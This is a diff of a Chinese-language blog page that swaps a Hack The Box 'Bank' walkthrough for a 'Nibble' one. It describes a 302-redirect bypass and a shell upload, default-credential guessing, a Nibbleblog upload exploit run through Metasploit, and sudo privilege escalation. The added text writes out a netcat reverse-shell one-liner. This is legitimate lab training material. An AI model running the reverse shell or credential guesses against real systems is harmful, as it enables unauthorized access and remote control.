@@ -79,30 +79,33 @@
 
 
 
-<meta name="description" content="扫描端口信息：  直接访问80端口没有有效信息。 由于开放了53端口DNS服务，因此尝试修改本地hosts文件：  访问bank.htb页面如下：  尝试弱口令不成功 爆破子目录：  发现了support.php,尝试访问，发现跳转到了上述login.php burpsuite抓包观察到这其中发生了302重定向跳转：  利用burpsuite修改respones头部的302：  成功来到suppo">
+<meta name="description" content="扫描端口信息：  访问80端口web服务：  查看网页源码，看到以下提示信息：  访问提示的nibbleblog子目录：  爆破当前的子目录：  发现admin.php页面，访问页面如下：  尝试用户名与口令登陆 htb常见的登录凭证格式如下：123456admin:adminadmin:passwordadmin:&amp;#123;BOX_NAME&amp;#125;&amp;#123;BOX_NAME&amp;#125;:">
 <meta name="keywords" content="htb walkthrough">
 <meta property="og:type" content="article">
-<meta property="og:title" content="htb-bank-walkthrough">
-<meta property="og:url" content="http://yoursite.com/2019/04/23/htb-bank-walkthrough/index.html">
+<meta property="og:title" content="htb-nibble-walkthrough">
+<meta property="og:url" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/index.html">
 <meta property="og:site_name" content="Ha0Za1-Pages">
-<meta property="og:description" content="扫描端口信息：  直接访问80端口没有有效信息。 由于开放了53端口DNS服务，因此尝试修改本地hosts文件：  访问bank.htb页面如下：  尝试弱口令不成功 爆破子目录：  发现了support.php,尝试访问，发现跳转到了上述login.php burpsuite抓包观察到这其中发生了302重定向跳转：  利用burpsuite修改respones头部的302：  成功来到suppo">
+<meta property="og:description" content="扫描端口信息：  访问80端口web服务：  查看网页源码，看到以下提示信息：  访问提示的nibbleblog子目录：  爆破当前的子目录：  发现admin.php页面，访问页面如下：  尝试用户名与口令登陆 htb常见的登录凭证格式如下：123456admin:adminadmin:passwordadmin:&amp;#123;BOX_NAME&amp;#125;&amp;#123;BOX_NAME&amp;#125;:">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/htb-bank-walkthrough/zenmap.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/htb-bank-walkthrough/hosts.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/htb-bank-walkthrough/login_php.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/htb-bank-walkthrough/gobuster.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/htb-bank-walkthrough/302_redirect.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/htb-bank-walkthrough/response_replace.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/htb-bank-walkthrough/support_php.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/htb-bank-walkthrough/php_cannot_upload.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/htb-bank-walkthrough/user_txt.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/htb-bank-walkthrough/suid.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/htb-bank-walkthrough/root_txt.png">
-<meta property="og:updated_time" content="2019-04-23T13:43:40.514Z">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/zenmap.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/default_page.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/view_source.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/nibbleblog_page.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/dirb_admin.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/admin_page.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/admin_login.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/google_nibbleblog.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/searchsploit.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/metasploit_user_shell.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/user_txt.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/sudo_l.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/monitor_sh_priv.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/sudo_root_shell.png">
+<meta property="og:updated_time" content="2019-05-14T15:34:00.627Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="htb-bank-walkthrough">
-<meta name="twitter:description" content="扫描端口信息：  直接访问80端口没有有效信息。 由于开放了53端口DNS服务，因此尝试修改本地hosts文件：  访问bank.htb页面如下：  尝试弱口令不成功 爆破子目录：  发现了support.php,尝试访问，发现跳转到了上述login.php burpsuite抓包观察到这其中发生了302重定向跳转：  利用burpsuite修改respones头部的302：  成功来到suppo">
-<meta name="twitter:image" content="http://yoursite.com/2019/04/23/htb-bank-walkthrough/zenmap.png">
+<meta name="twitter:title" content="htb-nibble-walkthrough">
+<meta name="twitter:description" content="扫描端口信息：  访问80端口web服务：  查看网页源码，看到以下提示信息：  访问提示的nibbleblog子目录：  爆破当前的子目录：  发现admin.php页面，访问页面如下：  尝试用户名与口令登陆 htb常见的登录凭证格式如下：123456admin:adminadmin:passwordadmin:&amp;#123;BOX_NAME&amp;#125;&amp;#123;BOX_NAME&amp;#125;:">
+<meta name="twitter:image" content="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/zenmap.png">
 
 
 
@@ -132,13 +135,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/23/htb-bank-walkthrough/">
+  <link rel="canonical" href="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/">
 
 
 
 
 
-  <title>htb-bank-walkthrough | Ha0Za1-Pages</title>
+  <title>htb-nibble-walkthrough | Ha0Za1-Pages</title>
   
 
 
@@ -255,7 +258,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/23/htb-bank-walkthrough/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/14/htb-nibble-walkthrough/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Ha0Za1">
@@ -272,7 +275,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">htb-bank-walkthrough</h1>
+          <h1 class="post-title" itemprop="name headline">htb-nibble-walkthrough</h1>
         
 
         <div class="post-meta">
@@ -284,8 +287,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-23T21:30:43+08:00">
-                2019-04-23
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-14T23:32:10+08:00">
+                2019-05-14
               </time>
             
 
@@ -324,33 +327,38 @@
       
         <p>扫描端口信息：</p>
 <p><img src="zenmap.png" alt="zenmap"></p>
-<p>直接访问80端口没有有效信息。</p>
-<p>由于开放了53端口DNS服务，因此尝试修改本地hosts文件：</p>
-<p><img src="hosts.png" alt="hosts"></p>
-<p>访问<code>bank.htb</code>页面如下：</p>
-<p><img src="login_php.png" alt="login_php"></p>
-<p>尝试弱口令不成功</p>
-<p>爆破子目录：</p>
-<p><img src="gobuster.png" alt="dirbuster"></p>
-<p>发现了<code>support.php</code>,尝试访问，发现跳转到了上述<code>login.php</code></p>
-<p><code>burpsuite</code>抓包观察到这其中发生了302重定向跳转：</p>
-<p><img src="302_redirect.png" alt="302_redirect"></p>
-<p>利用<code>burpsuite</code>修改<code>respones</code>头部的302：</p>
-<p><img src="response_replace.png" alt="response_replace"></p>
-<p>成功来到<code>support.php</code>页面：</p>
-<p><img src="support_php.png" alt="support_php"></p>
-<p>发现文件上传功能，尝试上传Php文件：</p>
-<p><img src="php_cannot_upload.png" alt="php_cannot_upload"></p>
-<p>上传失败，在response里发现这样一句话：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] --&gt;</span><br></pre></td></tr></table></figure>
-<p>将后缀修改为.htb，成功上传</p>
-<p>访问上传文件，成功获取shell，拿到<strong>user.txt</strong></p>
+<p>访问80端口web服务：</p>
+<p><img src="default_page.png" alt="default_page"></p>
+<p>查看网页源码，看到以下提示信息：</p>
+<p><img src="view_source.png" alt="view_source"></p>
+<p>访问提示的<strong>nibbleblog</strong>子目录：</p>
+<p><img src="nibbleblog_page.png" alt="nibbleblog_page"></p>
+<p>爆破当前的子目录：</p>
+<p><img src="dirb_admin.png" alt="dirb_nibbleblog"></p>
+<p>发现<strong>admin.php</strong>页面，访问页面如下：</p>
+<p><img src="admin_page.png" alt="admin_page"></p>
+<p>尝试用户名与口令登陆</p>
+<p>htb常见的登录凭证格式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin:admin</span><br><span class="line">admin:password</span><br><span class="line">admin:&#123;BOX_NAME&#125;</span><br><span class="line">&#123;BOX_NAME&#125;:&#123;BOX_NAME&#125;</span><br><span class="line">&#123;BOX_NAME&#125;:password</span><br><span class="line">&#123;BOX_NAME&#125;:admin</span><br></pre></td></tr></table></figure></p>
+<p>以<strong>admin:nibbles</strong>成功登录：</p>
+<p><img src="admin_login.png" alt="admin_login"></p>
+<p>google一下<strong>nibbleblog</strong>：</p>
+<p><img src="google_nibbleblog.png" alt="google_nibbleblog"></p>
+<p>为一blog系统，且存在相关漏洞</p>
+<p>searchsploit结果如下：</p>
+<p><img src="searchsploit.png" alt="searchsploit_nibbleblog"></p>
+<p>利用metasploit中相应的文件上传漏洞模块</p>
+<p><img src="metasploit_user_shell.png" alt="metasploit_user_shell"></p>
+<p>成功实现漏洞利用，拿到shell，获得<strong>user.txt</strong></p>
 <p><img src="user_txt.png" alt="user_txt"></p>
-<p>查询靶机可利用的提权信息：</p>
-<p><img src="suid.png" alt="priv_check"></p>
-<p><strong>emergency</strong>程序具有SUID标志，且当前用户可执行</p>
-<p>利用该程序成功提权，拿到<strong>root.txt</strong></p>
-<p><img src="root_txt.png" alt="root_txt"></p>
+<p>下一步尝试提权操作</p>
+<p>首先查看当前用户的权限信息：</p>
+<p><img src="sudo_l.png" alt="sudo_l"></p>
+<p>结果显示，当前用户可以以root权限运行monitor.sh程序</p>
+<p>将<strong>personal.zip</strong>文件解压，查看monitor.sh文件权限：</p>
+<p><img src="monitor_sh_priv.png" alt="monitor_sh_priv"></p>
+<p>可写。因此可以尝试在monitor.sh中写入reverse shell ，然后以root身份运行，本地即可获得root shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reverse shell:</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP port &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<p><img src="sudo_root_shell.png" alt="reverse_shell_root"></p>
 
       
     </div>
@@ -381,8 +389,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/22/htb-cronos-walkthrough/" rel="next" title="htb-cronos-walkthrough">
-                <i class="fa fa-chevron-left"></i> htb-cronos-walkthrough
+              <a href="/2019/05/09/htb-blue-walkthrough/" rel="next" title="htb-blue-walkthrough">
+                <i class="fa fa-chevron-left"></i> htb-blue-walkthrough
               </a>
             
           </div>
@@ -390,10 +398,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/23/htb-devel-walkthrough/" rel="prev" title="htb-devel-walkthrough">
-                htb-devel-walkthrough <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
